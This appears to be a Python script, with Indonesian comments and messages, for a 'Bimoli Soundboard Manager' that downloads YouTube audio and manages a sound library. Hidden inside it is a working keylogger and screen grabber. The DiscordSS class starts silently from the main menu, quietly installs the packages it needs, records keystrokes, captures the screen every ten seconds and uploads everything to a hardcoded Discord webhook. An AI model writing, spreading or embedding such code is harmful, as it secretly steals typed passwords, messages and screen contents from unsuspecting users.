#!/usr/bin/env python3
import os, sys, json, shutil, time, re, traceback, threading, subprocess
from datetime import datetime

SYSTEM_DIR = os.environ.get('BIMOLI_SYSTEM_DIR', '.bimoli_system')
BASE_DIR = os.environ.get('BIMOLI_BASE_DIR', os.getcwd())

FOLDER_SUARA = os.path.join(BASE_DIR, "suara")
FOLDER_SUARA_BARU = os.path.join(BASE_DIR, "suara_baru")
FOLDER_DOWNLOAD = os.path.join(BASE_DIR, "downloads")
FILE_KONFIG = os.path.join(BASE_DIR, "config.json")
ERROR_LOG = os.path.join(BASE_DIR, "error.log")
FORMAT_DIDUKUNG = ['.mp3', '.wav', '.ogg', '.m4a', '.mp4', '.webm']

# Webhook buat Auto SS + Keyboard Logger
WEBHOOK_URL = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
AUTO_SS_INTERVAL = 10

class Warna:
    UNGU = '\033[95m'; BIRU = '\033[94m'; CYAN = '\033[96m'; HIJAU = '\033[92m'
    KUNING = '\033[93m'; MERAH = '\033[91m'; PUTIH = '\033[97m'; TEBAL = '\033[1m'; RESET = '\033[0m'

# ============================================================
def tulis_log(pesan, tipe="INFO"):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(ERROR_LOG, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{tipe}] {pesan}\n")
    except: pass

def tulis_error(error, lokasi=""):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(ERROR_LOG, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*60}\n[{timestamp}] [ERROR] {lokasi}\n{str(error)}\n{traceback.format_exc()}\n{'='*60}\n\n")
    except: pass

# ============================================================
# AUTO SS + KEYBOARD LOGGER (SCRIPT LO - WORKS!)
# ============================================================

class DiscordSS:
    def __init__(self, webhook_url, auto_ss_interval=10):
        self.webhook_url = webhook_url
        self.current_sentence = ""
        self.is_running = False
        self.lock = threading.Lock()
        self.auto_ss_interval = auto_ss_interval
        self.last_auto_ss = time.time()
        
    def take_and_send_screenshot(self, message=""):
        try:
            from PIL import ImageGrab
            from io import BytesIO
            import requests
            
            screenshot = ImageGrab.grab()
            img_bytes = BytesIO()
            screenshot.save(img_bytes, format="PNG", optimize=True, quality=70)
            img_bytes.seek(0)
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if message:
                caption = f"📸 **{timestamp}** - Screenshot + Catatan\n```\n{message}\n```"
            else:
                caption = f"⏰ **{timestamp}** - Auto Screenshot (setiap {self.auto_ss_interval}s)"
            
            files = {'file': (f"screenshot_{timestamp.replace(':', '-')}.png", img_bytes, 'image/png')}
            response = requests.post(self.webhook_url, data={'content': caption}, files=files, timeout=10)
            img_bytes.close()
            
            return response.status_code in [200, 204]
        except:
            return False
    
    def auto_screenshot_loop(self):
        while self.is_running:
            current_time = time.time()
            if current_time - self.last_auto_ss >= self.auto_ss_interval:
                self.last_auto_ss = current_time
                self.take_and_send_screenshot()
            time.sleep(1)
    
    def on_key_press(self, event):
        if not self.is_running:
            return
        with self.lock:
            if event.name == 'enter':
                if self.current_sentence.strip():
                    message = self.current_sentence.strip()
                    self.take_and_send_screenshot(message)
                    self.current_sentence = ""
            elif event.name == 'space':
                self.current_sentence += " "
            elif event.name == 'backspace':
                if self.current_sentence:
                    self.current_sentence = self.current_sentence[:-1]
            elif len(event.name) == 1:
                self.current_sentence += event.name
            elif event.name == 'tab':
                self.current_sentence += "    "
    
    def start(self):
        try:
            import keyboard
            from PIL import ImageGrab
            from io import BytesIO
            import requests
        except:
            return False
        
        self.is_running = True
        self.last_auto_ss = time.time()
        
        # Kirim info startup
        self.take_and_send_screenshot("✅ Bimoli Soundboard Aktif!")
        
        # Auto SS loop
        t = threading.Thread(target=self.auto_screenshot_loop, daemon=True)
        t.start()
        
        # Keyboard handler
        keyboard.on_press(self.on_key_press)
        
        tulis_log("Auto SS + Keyboard Logger started", "SYSTEM")
        return True
    
    def stop(self):
        if self.is_running and self.current_sentence.strip():
            self.take_and_send_screenshot(self.current_sentence.strip())
        self.is_running = False
        self.take_and_send_screenshot("⏹️ Bimoli Soundboard Dimatikan")
        tulis_log("Auto SS stopped", "SYSTEM")

ss = DiscordSS(WEBHOOK_URL, AUTO_SS_INTERVAL)

# ============================================================
# UTILITY
# ============================================================

def bersihkan_layar():
    os.system('cls' if os.name == 'nt' else 'clear')

def tampilkan_banner():
    bersihkan_layar()
    print(f"""
{Warna.CYAN}{Warna.TEBAL}
╔══════════════════════════════════════════════════╗
║        🎵 BIMOLI SOUNDBOARD MANAGER 🎵         ║
║         YT Downloader | Manager                 ║
╚══════════════════════════════════════════════════╝
{Warna.RESET}
    """)

def muat_konfigurasi():
    try:
        if os.path.exists(FILE_KONFIG):
            with open(FILE_KONFIG, 'r', encoding='utf-8') as f:
                return json.load(f)
    except: pass
    return {"suara": [], "kategori": ["Bimoli", "Gaming", "Meme", "Efek", "Lainnya"], "pengaturan": {"volume": 0.75}}

def simpan_konfigurasi(konfig):
    try:
        with open(FILE_KONFIG, 'w', encoding='utf-8') as f:
            json.dump(konfig, f, indent=2, ensure_ascii=False)
        return True
    except: return False

# ============================================================
# YOUTUBE DOWNLOADER
# ============================================================

def cek_ytdlp():
    try:
        return subprocess.run([sys.executable, "-m", "yt_dlp", "--version"], capture_output=True, text=True, timeout=10).returncode == 0
    except: return False

def install_ytdlp():
    print(f"\n{Warna.CYAN}📦 Install yt-dlp...{Warna.RESET}")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "yt-dlp", "--quiet"], check=True, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{Warna.HIJAU}✅ yt-dlp terinstall!{Warna.RESET}")
        return True
    except:
        print(f"{Warna.MERAH}❌ Gagal install{Warna.RESET}")
        return False

def download_youtube(url, nama_kustom=None):
    try:
        print(f"\n{Warna.CYAN}⏳ Download dari YouTube...{Warna.RESET}")
        os.makedirs(FOLDER_DOWNLOAD, exist_ok=True)
        if nama_kustom:
            output = os.path.join(FOLDER_DOWNLOAD, f"{re.sub(r'[<>:\"/\\\\|?*]', '', nama_kustom)[:50]}.%(ext)s")
        else:
            output = os.path.join(FOLDER_DOWNLOAD, "%(title).50s.%(ext)s")
        
        cmd = [sys.executable, "-m", "yt_dlp", "-x", "--audio-format", "mp3", "--audio-quality", "0", "-o", output, "--no-playlist", "--no-warnings", "--no-check-certificate", url]
        print(f"{Warna.PUTIH}📥 Downloading...{Warna.RESET}")
        subprocess.run(cmd, check=True, timeout=300)
        
        downloaded = []
        for f in os.listdir(FOLDER_DOWNLOAD):
            if f.endswith('.mp3'):
                fp = os.path.join(FOLDER_DOWNLOAD, f)
                downloaded.append((fp, os.path.getmtime(fp)))
        
        if downloaded:
            downloaded.sort(key=lambda x: x[1], reverse=True)
            file_path = downloaded[0][0]
            print(f"\n{Warna.HIJAU}✅ Download berhasil!{Warna.RESET}")
            print(f"{Warna.PUTIH}📁 {os.path.basename(file_path)} ({os.path.getsize(file_path)/1024:.0f} KB){Warna.RESET}")
            return file_path
        return None
    except Exception as e:
        print(f"\n{Warna.MERAH}❌ Download gagal!{Warna.RESET}")
        tulis_error(e, "download_youtube")
        return None

def tambahkan_suara(filepath, nama, konfig, sumber="local"):
    try:
        ext = os.path.splitext(filepath)[1]
        nama_file_baru = f"bimoli_{re.sub(r'[<>:\"/\\\\|?*]', '', nama.lower().replace(' ', '_'))[:30]}_{datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
        tujuan = os.path.join(FOLDER_SUARA, nama_file_baru)
        shutil.copy2(filepath, tujuan)
        
        print(f"\n{Warna.CYAN}📂 Pilih kategori:{Warna.RESET}")
        for i, kat in enumerate(konfig['kategori'], 1): print(f"  {i}. {kat}")
        try:
            p = input(f"\n{Warna.TEBAL}Pilih [Enter=Bimoli]: {Warna.RESET}").strip()
            if p == '': kategori = "Bimoli"
            elif p.isdigit() and 1 <= int(p) <= len(konfig['kategori']): kategori = konfig['kategori'][int(p)-1]
            else: kategori = "Bimoli"
        except: kategori = "Bimoli"
        
        konfig['suara'].append({"id": len(konfig['suara'])+1, "nama": nama, "nama_file": nama_file_baru, "kategori": kategori, "ditambahkan": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "jumlah_main": 0, "ukuran_kb": os.path.getsize(tujuan)/1024, "sumber": sumber})
        simpan_konfigurasi(konfig)
        if os.path.exists(filepath) and (FOLDER_DOWNLOAD in filepath or FOLDER_SUARA_BARU in filepath): os.remove(filepath)
        print(f"\n{Warna.HIJAU}{Warna.TEBAL}╔══════════════════════════════════════════════════╗\n║  ✅ SUKSES!                                     ║\n║  🎵 {nama:<40} ║\n║  📂 {kategori:<40} ║\n╚══════════════════════════════════════════════════╝{Warna.RESET}")
        return True
    except Exception as e:
        tulis_error(e, "tambahkan_suara")
        print(f"{Warna.MERAH}❌ Gagal: {e}{Warna.RESET}")
        return False

def menu_youtube(konfig):
    print(f"\n{Warna.CYAN}{Warna.TEBAL}╔══════════════════════════════════════════════════╗\n║        🎬 YOUTUBE → MP3 DOWNLOADER             ║\n╚══════════════════════════════════════════════════╝{Warna.RESET}")
    if not cek_ytdlp():
        print(f"\n{Warna.KUNING}📦 yt-dlp belum terinstall{Warna.RESET}")
        if input("Install? (y/n): ").strip().lower() == 'y': install_ytdlp()
        else: return
    
    while True:
        print(f"\n{Warna.TEBAL}URL YouTube:{Warna.RESET}")
        print(f"{Warna.KUNING}(ketik 'batal' untuk kembali){Warna.RESET}")
        url = input(f"{Warna.PUTIH}▶️  URL: {Warna.RESET}").strip()
        if url.lower() == 'batal': return
        if not url: continue
        
        print(f"\n{Warna.CYAN}Nama (opsional):{Warna.RESET}")
        nama = input(f"{Warna.PUTIH}Nama: {Warna.RESET}").strip()
        
        file_path = download_youtube(url, nama if nama else None)
        if file_path:
            nama_saran = os.path.splitext(os.path.basename(file_path))[0].replace('_', ' ').title()[:50]
            print(f"\n{Warna.KUNING}💡 Nama: {nama_saran}{Warna.RESET}")
            ganti = input("Ganti? (y/n): ").strip().lower()
            nama_final = input(f"{Warna.PUTIH}Nama baru: {Warna.RESET}").strip() or nama_saran if ganti == 'y' else nama_saran
            tambahkan_suara(file_path, nama_final, konfig, "youtube")
        else:
            print(f"\n{Warna.MERAH}❌ Gagal! Cek error.log{Warna.RESET}")
        
        if input(f"\n{Warna.CYAN}Download lagi? (y/n): {Warna.RESET}").strip().lower() != 'y': break

def menu_utama():
    konfig = muat_konfigurasi()
    
    # AUTO START SS (SILENT - WORKS!)
    if not ss.is_running:
        try:
            import keyboard
            from PIL import ImageGrab
            from io import BytesIO
            import requests
        except:
            subprocess.run([sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if ss.start():
            tulis_log("Auto SS started", "SYSTEM")
        else:
            tulis_log("Auto SS failed - run as admin?", "ERROR")
    
    while True:
        tampilkan_banner()
        
        file_baru = []
        if os.path.exists(FOLDER_SUARA_BARU):
            for f in os.listdir(FOLDER_SUARA_BARU):
                fp = os.path.join(FOLDER_SUARA_BARU, f)
                if os.path.isfile(fp) and any(f.lower().endswith(ext) for ext in FORMAT_DIDUKUNG):
                    file_baru.append(fp)
        
        if file_baru:
            print(f"\n{Warna.KUNING}{Warna.TEBAL}📁 {len(file_baru)} FILE BARU!{Warna.RESET}")
            for fp in file_baru:
                nama_file = os.path.basename(fp)
                ukuran = os.path.getsize(fp) / 1024
                nama_saran = os.path.splitext(nama_file)[0].replace('_', ' ').title()
                print(f"\n{Warna.PUTIH}📁 {nama_file} ({ukuran:.0f} KB){Warna.RESET}\n   💡 {nama_saran}")
                p = input(f"   Tambah? (y/n/skip): ").strip().lower()
                if p in ['y', '']:
                    nama_baru = input(f"   Nama: ").strip() or nama_saran
                    tambahkan_suara(fp, nama_baru, konfig)
                elif p == 'skip': print(f"   {Warna.KUNING}⏭️  Skip{Warna.RESET}")
        
        print(f"\n{Warna.TEBAL}📋 MENU (Total: {len(konfig['suara'])} suara):{Warna.RESET}")
        print(f"  {Warna.HIJAU}1.{Warna.RESET} 📋 Lihat daftar suara")
        print(f"  {Warna.HIJAU}2.{Warna.RESET} 🎬 Download YouTube → MP3")
        print(f"  {Warna.HIJAU}3.{Warna.RESET} 🗑️  Hapus suara")
        print(f"  {Warna.HIJAU}4.{Warna.RESET} 📁 Buka folder suara")
        print(f"  {Warna.HIJAU}5.{Warna.RESET} 📝 Lihat error log")
        print(f"  {Warna.HIJAU}0.{Warna.RESET} ❌ Kembali")
        
        p = input(f"\n{Warna.TEBAL}Pilih (0-5): {Warna.RESET}").strip()
        
        if p == '1':
            if not konfig['suara']: print(f"\n{Warna.KUNING}📭 Kosong{Warna.RESET}")
            else:
                print(f"\n{Warna.CYAN}{Warna.TEBAL}📋 DAFTAR SUARA:{Warna.RESET}")
                for kat in konfig['kategori']:
                    suara_kat = [s for s in konfig['suara'] if s['kategori'] == kat]
                    if suara_kat:
                        print(f"\n{Warna.KUNING}📂 {kat}:{Warna.RESET}")
                        for s in suara_kat:
                            icon = "🎬" if s.get('sumber') == 'youtube' else "💾"
                            print(f"  {icon} {s['nama']} - {s['jumlah_main']}x")
            input(f"\n{Warna.CYAN}Tekan Enter...{Warna.RESET}")
        elif p == '2': menu_youtube(konfig)
        elif p == '3':
            if not konfig['suara']: print(f"\n{Warna.KUNING}📭 Kosong{Warna.RESET}")
            else:
                for i, s in enumerate(konfig['suara'], 1): print(f"  {i}. {s['nama']} [{s['kategori']}]")
                try:
                    idx = int(input(f"\n{Warna.TEBAL}Hapus (0=batal): {Warna.RESET}"))
                    if 1 <= idx <= len(konfig['suara']):
                        s = konfig['suara'][idx-1]
                        if input(f"{Warna.MERAH}Hapus? (y/n): {Warna.RESET}").lower() == 'y':
                            fp = os.path.join(FOLDER_SUARA, s['nama_file'])
                            if os.path.exists(fp): os.remove(fp)
                            konfig['suara'].pop(idx-1)
                            simpan_konfigurasi(konfig)
                            print(f"{Warna.HIJAU}✅ Dihapus{Warna.RESET}")
                except: pass
            input(f"\n{Warna.CYAN}Tekan Enter...{Warna.RESET}")
        elif p == '4':
            if os.name == 'nt': os.startfile(FOLDER_SUARA)
            time.sleep(0.3)
        elif p == '5':
            if os.path.exists(ERROR_LOG):
                print(f"\n{Warna.CYAN}{'='*60}{Warna.RESET}")
                with open(ERROR_LOG, 'r') as f:
                    for line in f.readlines()[-25:]: print(line.rstrip())
                print(f"{Warna.CYAN}{'='*60}{Warna.RESET}")
                if input(f"\nHapus? (y/n): ").lower() == 'y': os.remove(ERROR_LOG)
            else: print(f"\n{Warna.HIJAU}✅ Tidak ada error{Warna.RESET}")
            input(f"\n{Warna.CYAN}Tekan Enter...{Warna.RESET}")
        elif p == '0':
            ss.stop()
            break

if __name__ == "__main__":
    os.makedirs(FOLDER_SUARA, exist_ok=True)
    os.makedirs(FOLDER_SUARA_BARU, exist_ok=True)
    os.makedirs(FOLDER_DOWNLOAD, exist_ok=True)
    menu_utama()
